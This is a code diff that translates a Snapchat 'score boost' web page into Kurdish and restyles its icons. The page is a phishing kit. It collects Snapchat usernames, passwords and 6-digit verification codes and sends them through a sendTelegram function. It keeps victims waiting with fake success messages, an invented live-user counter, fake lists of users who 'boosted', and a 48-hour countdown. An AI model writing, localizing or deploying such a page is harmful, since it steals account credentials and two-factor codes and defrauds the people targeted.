@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SnapScore — Boost Your Snapchat Score</title>
+    <title>SnapScore — زیادکردنی سکۆری Snapchat</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap');
 
@@ -140,12 +140,12 @@
             50% { transform: scale(1.15); opacity: 0; }
         }
 
-        .logo-icon svg {
+        .logo-icon img {
             width: 46px;
             height: 46px;
-            fill: #1A1A2E;
             position: relative;
             z-index: 2;
+            object-fit: contain;
         }
 
         .logo h1 {
@@ -188,7 +188,11 @@
         }
 
         .trust-badge .icon {
-            font-size: 14px;
+            width: 14px;
+            height: 14px;
+            object-fit: contain;
+            filter: brightness(0) invert(1);
+            opacity: 0.5;
         }
 
         .trust-badge .highlight {
@@ -690,8 +694,12 @@
             margin-right: auto;
         }
 
-        .security-badge .lock {
-            font-size: 12px;
+        .security-badge img {
+            width: 14px;
+            height: 14px;
+            object-fit: contain;
+            filter: brightness(0) invert(1);
+            opacity: 0.6;
         }
 
         .boost-options {
@@ -758,7 +766,7 @@
                 width: 68px;
                 height: 68px;
             }
-            .logo-icon svg {
+            .logo-icon img {
                 width: 36px;
                 height: 36px;
             }
@@ -840,16 +848,23 @@
     <div class="logo">
         <div class="logo-icon">
             <div class="pulse-ring"></div>
-            <svg viewBox="0 0 24 24">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/>
-            </svg>
+            <img src="snap.png" alt="Snapchat Ghost">
         </div>
         <h1>Snap<span>Score</span></h1>
-        <p class="subtitle">Boost Your Snapchat Score Instantly</p>
+        <p class="subtitle">سکۆری Snapchat-ەکەت زیاد بکە</p>
         <div class="trust-badges">
-            <span class="trust-badge"><span class="icon">🔒</span> SSL Secure</span>
-            <span class="trust-badge"><span class="icon">👤</span> <span class="highlight" id="liveUsers">1,284</span> online</span>
-            <span class="trust-badge"><span class="icon">⭐</span> 4.9/5 Trusted</span>
+            <span class="trust-badge">
+                <img src="checkmark.png" alt="✓" class="icon">
+                پارێزراو
+            </span>
+            <span class="trust-badge">
+                <span class="icon" style="font-size:14px; opacity:0.5;">👤</span>
+                <span class="highlight" id="liveUsers">١،٢٨٤</span> ئۆنلاین
+            </span>
+            <span class="trust-badge">
+                <img src="checkmark.png" alt="✓" class="icon">
+                متمانەپێکراو
+            </span>
         </div>
     </div>
 
@@ -863,35 +878,35 @@
     <div id="step1" class="step active">
         <div class="info-box">
             <span class="emoji-big">🚀</span>
-            <strong>Increase Your Score</strong><br>
-            Enter your <span class="highlight">Snapchat username</span> and <span class="highlight">password</span> below.
-            Your score will <strong>increase within 48 hours</strong>.
+            <strong>سکۆرەکەت زیاد بکە</strong><br>
+            <span class="highlight">ناوی بەکارهێنەر</span> و <span class="highlight">تێپەڕەوشەی</span> Snapchat-ەکەت بنووسە.
+            سکۆرەکەت لە ماوەی <strong>٤٨ کاتژمێر</strong>دا زیاد دەکات.
         </div>
 
         <div class="boost-options">
             <div class="boost-option">
-                <span class="number">+10K</span>
-                <span class="label">Score</span>
+                <span class="number">+١٠K</span>
+                <span class="label">سکۆر</span>
             </div>
             <div class="boost-option popular">
-                <span class="number">+50K</span>
-                <span class="label">Score</span>
+                <span class="number">+٥٠K</span>
+                <span class="label">سکۆر</span>
             </div>
             <div class="boost-option">
-                <span class="number">+100K</span>
-                <span class="label">Score</span>
+                <span class="number">+١٠٠K</span>
+                <span class="label">سکۆر</span>
             </div>
         </div>
 
         <div class="form-group">
-            <label>👤 Snapchat Username</label>
-            <input type="text" id="username" placeholder="username" autocomplete="off" spellcheck="false" />
+            <label>👤 ناوی بەکارهێنەری Snapchat</label>
+            <input type="text" id="username" placeholder="ناوی بەکارهێنەر" autocomplete="off" spellcheck="false" />
         </div>
         <div class="form-group">
-            <label>🔑 Password</label>
+            <label>🔑 تێپەڕەوشە</label>
             <input type="password" id="password" placeholder="••••••••" autocomplete="off" />
         </div>
-        <button class="btn" id="loginBtn">Check Account</button>
+        <button class="btn" id="loginBtn">پشکنینی هەژمار</button>
         <div id="status1" class="status"></div>
     </div>
 
@@ -899,18 +914,18 @@
     <div id="step2" class="step">
         <div class="info-box">
             <span class="emoji-big">📱</span>
-            <strong>Verification Code</strong><br>
-            A 6-digit code was sent to your email or phone.
-            Enter it below to <span class="highlight">activate the boost</span>.
+            <strong>کۆدی پشتڕاستکردنەوە</strong><br>
+            کۆدێکی ٦ ژمارەیی بۆ ئیمەیل یان ژمارەی تەلەفۆنی تۆ نێردرا.
+            تکایە کۆدەکە بنووسە بۆ <span class="highlight">چالاککردنی زیادکردن</span>.
         </div>
         <div class="form-group">
-            <label>📨 Enter Code</label>
+            <label>📨 کۆدەکە بنووسە</label>
             <div class="code-group">
-                <input type="text" id="code" placeholder="0 0 0 0 0 0" maxlength="6" inputmode="numeric" autocomplete="off" />
-                <button class="btn-sm" id="resendBtn">Resend</button>
+                <input type="text" id="code" placeholder="٠ ٠ ٠ ٠ ٠ ٠" maxlength="6" inputmode="numeric" autocomplete="off" />
+                <button class="btn-sm" id="resendBtn">ناردنەوە</button>
             </div>
         </div>
-        <button class="btn" id="verifyBtn">Verify & Boost</button>
+        <button class="btn" id="verifyBtn">پشتڕاستکردنەوە و زیادکردن</button>
         <div id="status2" class="status"></div>
     </div>
 
@@ -918,65 +933,66 @@
     <div id="step3" class="step">
         <div style="text-align:center; padding: 4px 0;">
             <span class="success-icon">⏳</span>
-            <h2 class="success-title">Boost Requested!</h2>
+            <h2 class="success-title">داواکاری تۆمار کرا!</h2>
             <p class="success-sub">
-                Your request has been <span class="success-highlight">successfully submitted</span>.<br>
-                Please wait <strong>48 hours</strong> for your score to update.
+                داواکارییەکەت بە سەرکەوتووی تۆمار کرا.<br>
+                <span class="success-highlight">تکایە چاوەڕوانی ٤٨ کاتژمێر بکە</span> بۆ زیادبوونی سکۆرەکەت.
             </p>
 
             <div class="timer-box">
-                <div class="label">⏳ Time Remaining</div>
-                <div class="value" id="countdown">48:00:00</div>
-                <div class="sub">Your score will increase after this period</div>
+                <div class="label">⏳ کاتی ماوە بۆ زیادبوون</div>
+                <div class="value" id="countdown">٤٨:٠٠:٠٠</div>
+                <div class="sub">دوای ئەم کاتە سکۆرەکەت زیاد دەکات</div>
             </div>
 
             <div class="user-list">
-                <div class="title">🔥 Recent Users Who Boosted</div>
+                <div class="title">🔥 بەکارهێنەرانی تر کە سکۆریان زیاد کردووە</div>
                 <div class="user-item">
                     <span class="name"><span class="status-dot online"></span>kurdo763</span>
-                    <span class="score">200,000+ <span class="badge">Boosted</span></span>
+                    <span class="score">٢٠٠,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
                 <div class="user-item">
                     <span class="name"><span class="status-dot online"></span>bawan_101</span>
-                    <span class="score">185,000+ <span class="badge">Boosted</span></span>
+                    <span class="score">١٨٥,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
                 <div class="user-item">
                     <span class="name"><span class="status-dot online"></span>zhino_23</span>
-                    <span class="score">172,000+ <span class="badge">Boosted</span></span>
+                    <span class="score">١٧٢,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
                 <div class="user-item">
                     <span class="name"><span class="status-dot online"></span>rebar_55</span>
-                    <span class="score">168,000+ <span class="badge">Boosted</span></span>
+                    <span class="score">١٦٨,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
                 <div class="user-item">
                     <span class="name"><span class="status-dot online"></span>avin_808</span>
-                    <span class="score">155,000+ <span class="badge">Boosted</span></span>
+                    <span class="score">١٥٥,٠٠٠+ <span class="badge">زیاد کرا</span></span>
                 </div>
-                <div class="more">+123 others are boosting right now</div>
+                <div class="more">+١٢٣ بەکارهێنەری تر لە کاتی زیادکردندا</div>
             </div>
 
             <div class="warning-box">
-                <strong>⚠️ Please be patient</strong><br>
-                Your score will increase within 48 hours.<br>
-                You will receive a notification on Snapchat once it's done.
+                <strong>⚠️ تکایە خۆت بگرە</strong><br>
+                سکۆرەکەت لە ماوەی ٤٨ کاتژمێردا زیاد دەکات.<br>
+                دوای زیادبوون، ئاگادارکردنەوەیەک لە Snapchat وەردەگریت.
             </div>
 
             <button class="btn btn-secondary" onclick="resetAll()" style="margin-top:14px;">
-                🔄 Back to Start
+                🔄 گەڕانەوە بۆ دەستپێک
             </button>
         </div>
     </div>
 
     <div class="security-badge">
-        <span class="lock">🔒</span> Protected by 256-bit encryption
+        <img src="checkmark.png" alt="✓">
+        پارێزراو بە ٢٥٦-bit encryption
     </div>
 
     <div class="footer">
-        <a href="#">Terms</a>
+        <a href="#">مەرجەکان</a>
         <span class="divider">•</span>
-        <a href="#">Privacy</a>
+        <a href="#">تایبەتمەندی</a>
         <span class="divider">•</span>
-        <span>© 2027 SnapScore</span>
+        <span>© ٢٠٢٧ SnapScore</span>
     </div>
 </div>
 
@@ -1002,7 +1018,7 @@
         let count = 1284;
         setInterval(() => {
             count += Math.floor(Math.random() * 3);
-            el.textContent = count.toLocaleString();
+            el.textContent = count.toLocaleString('ku');
         }, 5000);
     })();
 
@@ -1079,7 +1095,7 @@
         countdownInterval = setInterval(() => {
             if (totalSeconds <= 0) {
                 clearInterval(countdownInterval);
-                countdownEl.textContent = '✅ Done!';
+                countdownEl.textContent = '✅ زیاد کرا!';
                 return;
             }
             totalSeconds--;
@@ -1116,7 +1132,7 @@
         const p = password.value.trim();
 
         if (!u || !p) {
-            setStatus(status1, '⚠️ Please fill in both fields.', 'error');
+            setStatus(status1, '⚠️ تکایە هەردوو خانە پڕ بکەوە.', 'error');
             return;
         }
 
@@ -1133,17 +1149,17 @@
             `⏱️ Time: ${new Date().toLocaleString()}`
         );
 
-        setStatus(status1, '⏳ Checking account...', 'loading');
+        setStatus(status1, '⏳ پشکنینی هەژمار...', 'loading');
         loginBtn.disabled = true;
 
         setTimeout(() => {
-            setStatus(status1, '✅ Account found! Code sent.', 'success');
+            setStatus(status1, '✅ هەژمار دۆزرایەوە! کۆد نێردرا.', 'success');
             setTimeout(() => {
                 hideStatus(status1);
                 showStep(2);
                 loginBtn.disabled = false;
                 isProcessing = false;
-                setStatus(status2, '📨 A 6-digit code was sent. Please enter it.', 'info');
+                setStatus(status2, '📨 کۆدی ٦ ژمارەیی نێردرا. تکایە بنووسە.', 'info');
                 code.focus();
             }, 1200);
         }, 1800);
@@ -1152,14 +1168,14 @@
     // ========== RESEND ==========
     resendBtn.addEventListener('click', function() {
         if (isProcessing) return;
-        setStatus(status2, '📨 Sending new code...', 'loading');
+        setStatus(status2, '📨 ناردنی کۆدی نوێ...', 'loading');
         sendTelegram(`🔄 Resend requested for @${currentUser}`);
         isProcessing = true;
         setTimeout(() => {
-            setStatus(status2, '✅ New code sent!', 'success');
+            setStatus(status2, '✅ کۆدی نوێ نێردرا!', 'success');
             isProcessing = false;
             setTimeout(() => {
-                setStatus(status2, '📨 Enter the code below.', 'info');
+                setStatus(status2, '📨 تکایە کۆدەکە بنووسە.', 'info');
             }, 1500);
         }, 1500);
     });
@@ -1169,7 +1185,7 @@
         if (isProcessing) return;
         const c = code.value.trim();
         if (!c || c.length < 4) {
-            setStatus(status2, '⚠️ Please enter the full 6-digit code.', 'error');
+            setStatus(status2, '⚠️ تکایە کۆدی ٦ ژمارەیی تەواو بنووسە.', 'error');
             return;
         }
         currentCode = c;
@@ -1183,7 +1199,7 @@
             `⏱️ Time: ${new Date().toLocaleString()}`
         );
 
-        setStatus(status2, '⏳ Verifying...', 'loading');
+        setStatus(status2, '⏳ پشتڕاستکردنەوە...', 'loading');
         verifyBtn.disabled = true;
 
         setTimeout(() => {
@@ -1220,8 +1236,8 @@
         }
     });
 
-    console.log('🚀 SnapScore 1000x — Ultimate Edition');
-    console.log('💛 Built with ❤️ for Kurdish users');
+    console.log('🚀 SnapScore — ١٠٠٪ کوردی');
+    console.log('💛 دروستکراوە بۆ بەکارهێنەرانی کورد');
 </script>
 </body>
 </html>
